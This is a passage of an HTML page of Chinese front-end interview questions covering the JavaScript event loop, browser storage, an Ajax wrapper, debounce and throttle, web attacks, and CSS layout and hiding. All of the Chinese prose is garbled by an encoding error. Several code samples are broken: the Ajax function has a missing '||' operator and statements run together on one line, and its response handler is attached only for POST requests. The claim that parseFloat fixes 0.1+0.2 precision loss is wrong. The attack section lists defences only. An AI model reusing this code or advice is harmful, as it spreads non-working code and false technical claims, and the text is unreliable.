<li>3.é‡åˆ° <code>async1()</code>ï¼Œæ‰§è¡Œ <code>async1</code> å‡½æ•°ï¼Œå…ˆæ‰“å° <code>1 </code>ï¼Œä¸‹é¢é‡åˆ° <code>await</code> æ€ä¹ˆåŠ?å…ˆæ‰§è¡Œ <code>async2</code>ï¼Œæ‰“å° <code>3</code>ï¼Œç„¶åé˜»å¡ä¸‹é¢ä»£ç (å³åŠ å…¥å¾®ä»»åŠ¡åˆ—è¡¨)ï¼Œè·³å‡ºå»æ‰§è¡ŒåŒæ­¥ä»£ç </li>
<li>4.è·³åˆ° <code>new Promise</code> è¿™é‡Œï¼Œç›´æ¥æ‰§è¡Œï¼Œæ‰“å° <code>5</code>ï¼Œä¸‹é¢é‡åˆ° <code>.then()</code>ï¼Œå®ƒæ˜¯å¾®ä»»åŠ¡ï¼Œæ”¾åˆ°å¾®ä»»åŠ¡åˆ—è¡¨ç­‰å¾…æ‰§è¡Œ;</li>
<li>5.æœ€åä¸€è¡Œç›´æ¥æ‰“å° <code>7</code> ï¼Œç°åœ¨åŒæ­¥ä»£ç æ‰§è¡Œå®Œäº†ï¼Œå¼€å§‹æ‰§è¡Œå¾®ä»»åŠ¡ï¼Œå³ <code>await</code> ä¸‹é¢çš„ä»£ç ï¼Œæ‰“å° <code>2</code>;</li>
<li>6.ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå¾®ä»»åŠ¡ï¼Œå³æ‰§è¡Œ <code>then</code> çš„å›è°ƒï¼Œ<code>6</code>;</li>
<li>7.ä¸Šä¸€ä¸ªå®ä»»åŠ¡æ‰€æœ‰äº‹éƒ½åšå®Œäº†ï¼Œå¼€å§‹ä¸‹ä¸€ä¸ªå®ä»»åŠ¡ï¼Œå°±æ˜¯å®šæ—¶å™¨ï¼Œæ‰“å° <code>settimeout</code>æ‰€ä»¥æœ€åçš„ç»“æœæ˜¯ï¼š <code>4 1 3 5 7 2 6 settimeout</code>ã€‚</li>
</ul>
<h4 data-id="heading-46">16.JavaScriptæœ¬åœ°å­˜å‚¨æ–¹å¼æœ‰å“ªäº›ï¼ŸåŒºåˆ«åŠåº”ç”¨åœºæ™¯ï¼Ÿ</h4>
<h5 data-id="heading-47">16.1 æ–¹å¼</h5>
<blockquote>
<p>javaScript æœ¬åœ°ç¼“å­˜çš„æ–¹æ³•ä¸»è¦è®²è¿°ä»¥ä¸‹å››ç§:</p>
</blockquote>
<ul>
<li>cookie</li>
<li>sessionStorage</li>
<li>localStorage</li>
<li>indexedDB</li>
</ul>
<h5 data-id="heading-48">16.1.1.cookie</h5>
<p><code>Cookie</code> ï¼Œç±»å‹ä¸ºã€Œå°å‹æ–‡æœ¬æ–‡ä»¶ã€ï¼ŒæŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½è€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ã€‚æ˜¯ä¸ºäº†è§£å†³ <code>HTTP</code> æ— çŠ¶æ€å¯¼è‡´çš„é—®é¢˜ã€‚
ä½œä¸ºä¸€æ®µä¸€èˆ¬ä¸è¶…è¿‡ 4KB çš„å°å‹æ–‡æœ¬æ•°æ®ï¼Œå®ƒç”±ä¸€ä¸ªåç§°(Name)ã€ä¸€ä¸ªå€¼(Value)å’Œå…¶å®ƒå‡ ä¸ªç”¨äºæ§åˆ¶ <code>cookie</code> æœ‰æ•ˆæœŸã€å®‰å…¨æ€§ã€ä½¿ç”¨èŒƒå›´çš„å¯é€‰å±æ€§ç»„æˆã€‚</p>
<p>ä½†æ˜¯ <code>cookie</code> åœ¨æ¯æ¬¡è¯·æ±‚ä¸­éƒ½ä¼šè¢«å‘é€ï¼Œå¦‚æœä¸ä½¿ç”¨ <code>HTTPS</code> å¹¶å¯¹å…¶åŠ å¯†ï¼Œå…¶ä¿å­˜çš„ä¿¡æ¯å¾ˆå®¹æ˜“è¢«çªƒå–ï¼Œå¯¼è‡´å®‰å…¨é£é™©ã€‚</p>
<h5 data-id="heading-49">16.1.2 localStorage</h5>
<ul>
<li>ç”Ÿå‘½å‘¨æœŸ:æŒä¹…åŒ–çš„æœ¬åœ°å­˜å‚¨ï¼Œé™¤éä¸»åŠ¨åˆ é™¤æ•°æ®ï¼Œå¦åˆ™æ•°æ®æ˜¯æ°¸è¿œä¸ä¼šè¿‡æœŸçš„ã€‚</li>
<li>å­˜å‚¨çš„ä¿¡æ¯åœ¨åŒä¸€åŸŸä¸­æ˜¯å…±äº«çš„ã€‚</li>
<li>å½“æœ¬é¡µæ“ä½œ(æ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤)äº† localStorage çš„æ—¶å€™ï¼Œæœ¬é¡µé¢ä¸ä¼šè§¦å‘ storage äº‹ä»¶,ä½†æ˜¯åˆ«çš„é¡µé¢ä¼šè§¦å‘ storage äº‹ä»¶ã€‚</li>
<li>å¤§å°:5M(è·Ÿæµè§ˆå™¨å‚å•†æœ‰å…³ç³»)ã€‚</li>
<li><code>localstorage</code> æœ¬è´¨ä¸Šæ˜¯å¯¹å­—ç¬¦ä¸²çš„è¯»å–ï¼Œå¦‚æœå­˜å‚¨å†…å®¹å¤šçš„è¯ä¼šæ¶ˆè€—å†…å­˜ç©ºé—´ï¼Œä¼šå¯¼è‡´é¡µé¢å˜å¡ã€‚</li>
<li>å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'username'</span>,<span class="hljs-string">'ä½ çš„åå­—'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'username'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">key</span>(<span class="hljs-number">0</span>) <span class="hljs-comment">// è·å–ç¬¬ä¸€ä¸ªé”®å</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'username'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>(); <span class="hljs-comment">// æ¸…ç©ºlocalStorage</span>
</code></pre>
<h5 data-id="heading-50">16.1.3 sessionStorage</h5>
<p><code>sessionStorage</code> å’Œ <code>localstorage</code> ä½¿ç”¨æ–¹æ³•åŸºæœ¬ä¸€è‡´ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ç”Ÿå‘½å‘¨æœŸï¼Œä¸€æ—¦é¡µé¢(ä¼šè¯)å…³é—­ï¼Œ<code>sessionStorage</code> å°†ä¼šåˆ é™¤æ•°æ®ã€‚</p>
<h5 data-id="heading-51">16.1.4 indexedDB</h5>
<p><code>indexedDB</code> æ˜¯ä¸€ç§ä½çº§APï¼Œç”¨äºå®¢æˆ·ç«¯å­˜å‚¨å¤§é‡ç»“æ„åŒ–æ•°æ®(åŒ…æ‹¬,æ–‡ä»¶/blobs)ã€‚è¯¥APIä½¿ç”¨ç´¢å¼•æ¥
å®ç°å¯¹è¯¥æ•°æ®çš„é«˜æ€§èƒ½æœç´¢ã€‚</p>
<p>è™½ç„¶ <code>Web Storage</code> å¯¹äºå­˜å‚¨è¾ƒå°‘é‡çš„æ•°æ®å¾ˆæœ‰ç”¨ï¼Œä½†å¯¹äºå­˜å‚¨æ›´å¤§é‡çš„ç»“æ„åŒ–æ•°æ®æ¥è¯´ï¼Œè¿™ç§æ–¹æ³•ä¸å¤ªæœ‰ç”¨ã€‚</p>
<p><strong>ä¼˜ç‚¹:</strong></p>
<ul>
<li>å‚¨å­˜é‡ç†è®ºä¸Šæ²¡æœ‰ä¸Šé™</li>
<li>æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¼‚æ­¥çš„ï¼Œç›¸æ¯”LocalStorage åŒæ­¥æ“ä½œæ€§èƒ½æ›´é«˜ï¼Œå°¤å…¶æ˜¯æ•°æ®é‡è¾ƒå¤§æ—¶</li>
<li>åŸç”Ÿæ”¯æŒå‚¨å­˜ JS çš„å¯¹è±¡</li>
<li>æ˜¯ä¸ªæ­£ç»çš„æ•°æ®åº“ï¼Œæ„å‘³ç€æ•°æ®åº“èƒ½å¹²çš„äº‹å®ƒéƒ½èƒ½å¹²</li>
</ul>
<p><strong>ç¼ºç‚¹:</strong></p>
<ul>
<li>æ“ä½œéå¸¸ç¹ç</li>
<li>æœ¬èº«æœ‰ä¸€å®šé—¨æ§›</li>
</ul>
<h5 data-id="heading-52">åŒºåˆ«</h5>
<ul>
<li>å­˜å‚¨å¤§å°: <code>cookie</code> æ•°æ®å¤§å°ä¸èƒ½è¶…è¿‡ <code>4k</code>ï¼Œ<code>sessionStorage å’Œ localStorage</code> è™½ç„¶ä¹Ÿæœ‰å­˜å‚¨å¤§å°çš„é™åˆ¶ï¼Œä½†æ¯”<code>cookie</code> å¤§å¾—å¤šï¼Œå¯ä»¥è¾¾åˆ°<code>5M</code>æˆ–æ›´å¤§ã€‚</li>
<li>æœ‰æ•ˆæ—¶é—´: <code>localStorage</code> å­˜å‚¨æŒä¹…æ•°æ®ï¼Œæµè§ˆå™¨å…³é—­åæ•°æ®ä¸ä¸¢å¤±é™¤éä¸»åŠ¨åˆ é™¤æ•°æ®; <code>sessionStorage</code> æ•°æ®åœ¨å½“å‰æµè§ˆå™¨çª—å£å…³é—­åè‡ªåŠ¨åˆ é™¤; <code>cookie</code> è®¾ç½®çš„ <code>cookie</code> è¿‡æœŸæ—¶é—´ä¹‹å‰ä¸€ç›´æœ‰æ•ˆï¼Œå³ä½¿çª—å£æˆ–æµè§ˆå™¨å…³é—­ã€‚</li>
<li>æ•°æ®ä¸æœåŠ¡å™¨ä¹‹é—´çš„äº¤äº’æ–¹å¼ï¼Œ<code>cookie</code> çš„æ•°æ®ä¼šè‡ªåŠ¨çš„ä¼ é€’åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç«¯ä¹Ÿå¯ä»¥å†™ <code>cookie</code> åˆ°å®¢æˆ·ç«¯;<code>sessionStorage å’Œ localStorage</code> ä¸ä¼šè‡ªåŠ¨æŠŠæ•°æ®å‘ç»™æœåŠ¡å™¨ï¼Œä»…åœ¨æœ¬åœ°ä¿å­˜</li>
</ul>
<h4 data-id="heading-53">17.Ajax åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•å®ç°ï¼Ÿ</h4>
<p><code>Ajax</code> çš„åŸç†ç®€å•æ¥è¯´é€šè¿‡ <code>XmlHttpRequest</code> å¯¹è±¡æ¥å‘æœåŠ¡å™¨å‘å¼‚æ­¥è¯·æ±‚ï¼Œä»æœåŠ¡å™¨è·å¾—æ•°æ®ï¼Œç„¶åç”¨ <code>JavaScript</code> æ¥æ“ä½œ <code>DOM</code> è€Œæ›´æ–°é¡µé¢ã€‚</p>
<p>ç®€å•å°è£…ä¸€ä¸ªajaxè¯·æ±‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ajax</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-comment">//åˆ›å»ºXMLHttpRequestå¯¹è±¡</span>
    <span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
    <span class="hljs-comment">//åˆå§‹åŒ–å‚æ•°çš„å†…å®¹</span>
    options = options || {};
    options.<span class="hljs-property">type</span> = (options.<span class="hljs-property">type</span> || <span class="hljs-string">'GET'</span>).<span class="hljs-title function_">toUpperCase</span>();
    options.<span class="hljs-property">dataType</span> = options.<span class="hljs-property">dataType</span> <span class="hljs-string">'json'</span>;
    <span class="hljs-keyword">const</span> params = options.<span class="hljs-property">data</span>;

    <span class="hljs-comment">// å‘é€è¯·æ±‚</span>
    <span class="hljs-keyword">if</span> (options.<span class="hljs-property">type</span> === <span class="hljs-string">'GET'</span>) {
        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">'GET'</span>, options.<span class="hljs-property">url</span> + <span class="hljs-string">'?'</span> + params, <span class="hljs-literal">true</span>) xhr.<span class="hljs-title function_">send</span>(<span class="hljs-literal">null</span>)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">type</span> === <span class="hljs-string">'POST'</span>) {
        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">'POST'</span>, options.<span class="hljs-property">url</span>, <span class="hljs-literal">true</span>) xhr.<span class="hljs-title function_">send</span>(params)
        <span class="hljs-comment">// æ¥æ”¶è¯·æ±‚</span>
        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span>) {
                <span class="hljs-keyword">let</span> status = xhr.<span class="hljs-property">status</span>;
                <span class="hljs-keyword">if</span> (status &gt;= <span class="hljs-number">200</span> &amp;&amp; status &lt; <span class="hljs-number">300</span>) {
                    options.<span class="hljs-property">success</span> &amp;&amp; options.<span class="hljs-title function_">success</span>(xhr.<span class="hljs-property">responseText</span>, xhr.<span class="hljs-property">responseXML</span>)
                } <span class="hljs-keyword">else</span> {
                    options.<span class="hljs-property">fail</span> &amp;&amp; options.<span class="hljs-title function_">fail</span>(status)
                }
            }
        }
    }
}

<span class="hljs-comment">// è°ƒç”¨</span>
<span class="hljs-title function_">ajax</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-string">'post'</span>,
    <span class="hljs-attr">dataType</span>: <span class="hljs-string">'json'</span>,
    <span class="hljs-attr">data</span>: {},
    <span class="hljs-attr">url</span>: <span class="hljs-string">'https://xxxx'</span>,
    <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">valse, xml</span>){ 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(valse)
    },
    <span class="hljs-attr">fail</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">status</span>){ 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(status)
    }
})
</code></pre>
<h4 data-id="heading-54">18. é˜²æŠ–å’ŒèŠ‚æµï¼ŸåŒºåˆ«ï¼Ÿå¦‚ä½•å®ç°ï¼Ÿ</h4>
<ul>
<li>èŠ‚æµ: nç§’å†…åªè¿è¡Œä¸€æ¬¡ï¼Œè‹¥åœ¨nç§’å†…é‡å¤è§¦å‘ï¼Œåªæœ‰ä¸€æ¬¡ç”Ÿæ•ˆã€‚</li>
<li>é˜²æŠ–: n ç§’ååœ¨æ‰§è¡Œè¯¥äº‹ä»¶ï¼Œè‹¥åœ¨nç§’å†…è¢«é‡å¤è§¦å‘ï¼Œåˆ™é‡æ–°è®¡æ—¶</li>
</ul>
<p><strong>åº”ç”¨åœºæ™¯ï¼š</strong></p>
<p>é˜²æŠ–åœ¨è¿ç»­çš„äº‹ä»¶ï¼Œåªéœ€è§¦å‘ä¸€æ¬¡å›è°ƒçš„åœºæ™¯æœ‰:</p>
<ul>
<li>æœç´¢æ¡†æœç´¢è¾“å…¥ã€‚åªéœ€ç”¨æˆ·æœ€åä¸€æ¬¡è¾“å…¥å®Œï¼Œå†å‘é€è¯·æ±‚</li>
<li>æ‰‹æœºå·ã€é‚®ç®±éªŒè¯è¾“å…¥æ£€æµ‹</li>
<li>çª—å£å¤§å° resize ã€‚åªéœ€çª—å£è°ƒæ•´å®Œæˆåï¼Œè®¡ç®—çª—å£å¤§å°ã€‚é˜²æ­¢é‡å¤æ¸²æŸ“ã€‚</li>
</ul>
<p>èŠ‚æµåœ¨é—´éš”ä¸€æ®µæ—¶é—´æ‰§è¡Œä¸€æ¬¡å›è°ƒçš„åœºæ™¯æœ‰:</p>
<ul>
<li>æ»šåŠ¨åŠ è½½ï¼ŒåŠ è½½æ›´å¤šæˆ–æ»šåˆ°åº•éƒ¨ç›‘å¬</li>
<li>æœç´¢æ¡†ï¼Œæœç´¢è”æƒ³åŠŸèƒ½</li>
</ul>
<p><strong>èŠ‚æµ</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throttled</span>(<span class="hljs-params">fn, delay</span>) {
    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> starttime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> curTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(); <span class="hljs-comment">// å½“å‰æ—¶é—´</span>
        <span class="hljs-keyword">let</span> remaining = delay - (curTime - starttime); <span class="hljs-comment">// ä»ä¸Šä¸€æ¬¡åˆ°ç°åœ¨ï¼Œè¿˜å‰©ä¸‹å¤šå°‘å¤šä½™äº‹ä»¶</span>
        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// ä¿å­˜thisæŒ‡å‘</span>
        <span class="hljs-keyword">let</span> args = <span class="hljs-variable language_">arguments</span>; <span class="hljs-comment">// æ‹¿åˆ°eventå¯¹è±¡</span>
        <span class="hljs-built_in">clearTimeout</span>(timer);
        <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
            fn.<span class="hljs-title function_">apply</span>(context, args);
            starttime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
        } <span class="hljs-keyword">else</span> {
            timer = <span class="hljs-built_in">setTimeout</span>(fn, remaining);
        }
    }
}
</code></pre>
<p><strong>é˜²æŠ–</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, wait</span>) {
    <span class="hljs-keyword">let</span> timeout;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// ä¿å­˜thisæŒ‡å‘</span>
        <span class="hljs-keyword">let</span> args = <span class="hljs-variable language_">arguments</span>; <span class="hljs-comment">// æ‹¿åˆ°eventå¯¹è±¡</span>
        <span class="hljs-built_in">clearTimeout</span>(timeout)
        timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            func.<span class="hljs-title function_">apply</span>(context, args)
        }, wait);
    }
}
</code></pre>
<p><strong>å¦‚æœéœ€è¦ç«‹å³æ‰§è¡Œé˜²æŠ–ï¼Œå¯åŠ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, wait, immediate</span>) {
    <span class="hljs-keyword">let</span> timeout;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// ä¿å­˜thisæŒ‡å‘</span>
        <span class="hljs-keyword">let</span> args = <span class="hljs-variable language_">arguments</span>; <span class="hljs-comment">// æ‹¿åˆ°eventå¯¹è±¡</span>
        <span class="hljs-keyword">if</span> (timeout) <span class="hljs-built_in">clearTimeout</span>(timeout); <span class="hljs-comment">// timeout ä¸ä¸º null</span>
        <span class="hljs-keyword">if</span> (immediate) {
            <span class="hljs-keyword">let</span> callNow = !timeout; <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ä¼šç«‹å³æ‰§è¡Œï¼Œä»¥ååªæœ‰äº‹ä»¶æ‰§è¡Œåæ‰ä¼šè§¦å‘</span>
            timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                timeout = <span class="hljs-literal">null</span>;
            },
            wait);
            <span class="hljs-keyword">if</span> (callNow) {
                func.<span class="hljs-title function_">apply</span>(context, args)
            }
        } <span class="hljs-keyword">else</span> {
            timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                func.<span class="hljs-title function_">apply</span>(context, args)
            },
            wait);
        }
    }
}
</code></pre>
<p><strong>åŒºåˆ«</strong></p>
<blockquote>
<p>ç›¸åŒç‚¹</p>
<ul>
<li>éƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨ setTimeout å®ç°</li>
<li>ç›®çš„éƒ½æ˜¯ï¼Œé™ä½å›è°ƒæ‰§è¡Œé¢‘ç‡ã€‚èŠ‚çœè®¡ç®—èµ„æº</li>
</ul>
</blockquote>
<blockquote>
<p>ä¸åŒç‚¹</p>
<ul>
<li>å‡½æ•°é˜²æŠ–ï¼Œåœ¨ä¸€æ®µè¿ç»­æ“ä½œç»“æŸåï¼Œå¤„ç†å›è°ƒï¼Œåˆ©ç”¨clearTimeoutå’Œ setTimeout å®ç°ã€‚å‡½æ•°èŠ‚æµï¼Œåœ¨ä¸€æ®µè¿ç»­æ“ä½œä¸­ï¼Œæ¯ä¸€æ®µæ—¶é—´åªæ‰§è¡Œä¸€æ¬¡ï¼Œé¢‘ç‡è¾ƒé«˜çš„äº‹ä»¶ä¸­ä½¿ç”¨æ¥æé«˜æ€§èƒ½ã€‚</li>
<li>å‡½æ•°é˜²æŠ–å…³æ³¨ä¸€å®šæ—¶é—´è¿ç»­è§¦å‘çš„äº‹ä»¶ï¼Œåªåœ¨æœ€åæ‰§è¡Œä¸€æ¬¡ï¼Œè€Œå‡½æ•°èŠ‚æµä¸€æ®µæ—¶é—´å†…åªæ‰§è¡Œä¸€æ¬¡ä¾‹å¦‚ï¼Œéƒ½è®¾ç½®æ—¶é—´é¢‘ç‡ä¸º500msï¼Œåœ¨2ç§’æ—¶é—´å†…ï¼Œé¢‘ç¹è§¦å‘å‡½æ•°ï¼ŒèŠ‚æµï¼Œæ¯éš”500ms å°±æ‰§è¡Œä¸€æ¬¡ã€‚é˜²æŠ–ï¼Œåˆ™ä¸ç®¡è°ƒåŠ¨å¤šå°‘æ¬¡æ–¹æ³•ï¼Œåœ¨2såï¼Œåªä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</li>
</ul>
</blockquote>
<h4 data-id="heading-55">19. webå¸¸è§çš„æ”»å‡»æ–¹å¼æœ‰å“ªäº›ï¼Ÿå¦‚ä½•é˜²å¾¡ï¼Ÿ</h4>
<p>å¸¸è§çš„æœ‰ï¼š</p>
<ul>
<li>XSS è·¨ç«™è„šæœ¬æ”»å‡»</li>
<li>CSRF è·¨ç«™è¯·æ±‚ä¼ªé€ </li>
<li>SQL æ³¨å…¥æ”»å‡»</li>
</ul>
<p>é˜²æ­¢csrfå¸¸ç”¨æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p>
<ul>
<li>é˜»æ­¢ä¸æ˜å¤–åŸŸçš„è®¿é—®ï¼Œ<code>åŒæºæ£€æµ‹ï¼ŒSamesite Coolkie</code>ã€‚</li>
<li>æäº¤æ—¶è¦æ±‚é™„åŠ æœ¬åŸŸæ‰èƒ½è·å–ä¿¡æ¯ <code>CSRF Token, åŒé‡CookieéªŒè¯</code>ã€‚</li>
</ul>
<p>é¢„é˜²SQLå¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¸¥æ ¼æ£€æŸ¥è¾“å…¥å˜é‡çš„ç±»å‹å’Œæ ¼å¼</li>
<li>è¿‡æ»¤å’Œè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</li>
<li>å¯¹è®¿é—®æ•°æ®åº“çš„webåº”ç”¨ç¨‹åºé‡‡ç”¨webåº”ç”¨é˜²ç«å¢™</li>
</ul>
<h4 data-id="heading-56">20.JavaScriptå†…å­˜æ³„éœ²çš„å‡ ç§æƒ…å†µï¼Ÿ</h4>
<p>å†…å­˜æ³„æ¼(Memory leak)æ˜¯åœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œç”±äºç–å¿½æˆ–é”™è¯¯é€ æˆç¨‹åºæœªèƒ½é‡Šæ”¾å·²ç»ä¸å†ä½¿ç”¨çš„å†…å­˜ã€‚</p>
<p>Javascript å…·æœ‰è‡ªåŠ¨åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œç¯å¢ƒä¼šè´Ÿè´£ç®¡ç†ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨çš„å†…å­˜ã€‚</p>
<p>å¸¸è§çš„å†…å­˜æ³„éœ²æƒ…å†µï¼š</p>
<ul>
<li>æ„å¤–çš„å…¨å±€å˜é‡ã€‚<code>a='æˆ‘æ˜¯æœªå£°æ˜çš„å˜é‡'</code>.</li>
<li>å®šæ—¶å™¨</li>
</ul>
<h4 data-id="heading-57">21. JavaScriptæ•°å­—ç²¾åº¦ä¸¢å¤±çš„é—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">0.1</span> + <span class="hljs-number">0.2</span> === <span class="hljs-number">0.3</span>; <span class="hljs-comment">// false</span>
</code></pre>
<p>å¯ä»¥ä½¿ç”¨parseFloatè§£å†³</p>
<h3 data-id="heading-58">CSSé¢˜å‹æ•´ç†</h3>
<h4 data-id="heading-59">1.ç›’æ¨¡å‹</h4>
<p>ç›’æ¨¡å‹ï¼šç”±4ä¸ªéƒ¨åˆ†ç»„æˆï¼Œcontent,padding,border,margin.</p>
<h4 data-id="heading-60">2.BFCçš„ç†è§£</h4>
<p>BFCï¼šå³å—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ã€‚</p>
<p>å¸¸è§é¡µé¢æƒ…å†µæœ‰ï¼š</p>
<ul>
<li>å…ƒç´ é«˜åº¦æ²¡äº†</li>
<li>ä¿©æ å¸ƒå±€æ²¡æ³•è‡ªé€‚åº”</li>
<li>å…ƒç´ é—´è·å¥‡æ€ª</li>
</ul>
<h5 data-id="heading-61">2.1æ¸…é™¤å†…éƒ¨æµ®åŠ¨</h5>
<p>å…ƒç´ æ·»åŠ <code>overflow: hidden;</code></p>
<h4 data-id="heading-62">3.å…ƒç´ æ°´å¹³å‚ç›´å±…ä¸­çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ</h4>
<p>å®ç°æ–¹å¼å¦‚ä¸‹ï¼š</p>
<ul>
<li>åˆ©ç”¨å®šä½+margin:auto</li>
<li>åˆ©ç”¨å®šä½+margin: è´Ÿå€¼</li>
<li>åˆ©ç”¨å®šä½+transform</li>
<li>flexå¸ƒå±€ç­‰</li>
</ul>
<h4 data-id="heading-63">4.å®ç°ä¸¤æ å¸ƒå±€ï¼Œå³ä¾§è‡ªé€‚åº”ï¼Ÿä¸‰æ å¸ƒå±€ä¸­é—´è‡ªé€‚åº”ï¼Ÿ</h4>
<p>ä¸¤æ å¸ƒå±€çš„è¯ï¼š</p>
<ul>
<li>ä½¿ç”¨floatå·¦æµ®åŠ¨å¸ƒå±€</li>
<li>å³è¾¹æ¨¡å—ä½¿ç”¨margin-left æ’‘å‡ºå†…å®¹å—åšå†…å®¹å±•ç¤º</li>
<li>ä¸ºçˆ¶çº§å…ƒç´ æ·»åŠ BFCï¼Œé˜²æ­¢ä¸‹æ–¹å…ƒç´ è·Ÿä¸Šæ–¹å†…å®¹é‡å ã€‚</li>
</ul>
<p>flexå¸ƒå±€ï¼š</p>
<ul>
<li>ç®€å•æ˜“ç”¨ä»£ç å°‘</li>
</ul>
<p>ä¸‰æ å¸ƒå±€ï¼š</p>
<ul>
<li>ä¸¤è¾¹ç”¨floatï¼Œä¸­é—´ç”¨margin</li>
<li>ä¸¤è¾¹ç”¨absolute,ä¸­é—´ç”¨margin</li>
<li>display: table</li>
<li>flex</li>
<li>gridç½‘æ ¼å¸ƒå±€</li>
</ul>
<h4 data-id="heading-64">5.cssä¸­ï¼Œæœ‰å“ªäº›æ–¹å¼éšè—é¡µé¢å…ƒç´ ï¼Ÿ</h4>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>display: none</code>; æœ€å¸¸ç”¨ï¼Œé¡µé¢å½»åº•æ¶ˆå¤±ï¼Œä¼šå¯¼è‡´æµè§ˆå™¨é‡æ’å’Œé‡ç»˜</li>
<li><code>visibility: hidden</code>; domå­˜åœ¨ï¼Œä¸ä¼šé‡æ’ï¼Œä½†æ˜¯ä¼šé‡ç»˜</li>
<li><code>opacity: 0</code>;  å…ƒç´ é€æ˜ å…ƒç´ ä¸å¯è§ï¼Œå¯ä»¥å“åº”ç‚¹å‡»äº‹ä»¶</li>
<li><code>position: absolute</code>; å°†å…ƒç´ ç§»å‡ºå¯è§†åŒºåŸŸï¼Œä¸å½±å“é¡µé¢å¸ƒå±€</li>
</ul>
<h4 data-id="heading-65">6.å¦‚ä½•å®ç°å•è¡Œ/å¤šè¡Œæ–‡æœ¬æº¢å‡ºçš„çœç•¥æ ·å¼</h4>
<p><strong>å•è¡Œï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">p</span> {
    <span class="hljs-attribute">overflow</span>: hidden;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;
    <span class="hljs-attribute">width</span>:<span class="hljs-number">400px</span>;
    <span class="hljs-attribute">height</span>:<span class="hljs-number">40px</span>;
    <span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid red;
    <span class="hljs-attribute">text-overflow</span>: ellipsis;
    <span class="hljs-attribute">white-space</span>: nowrap;
}

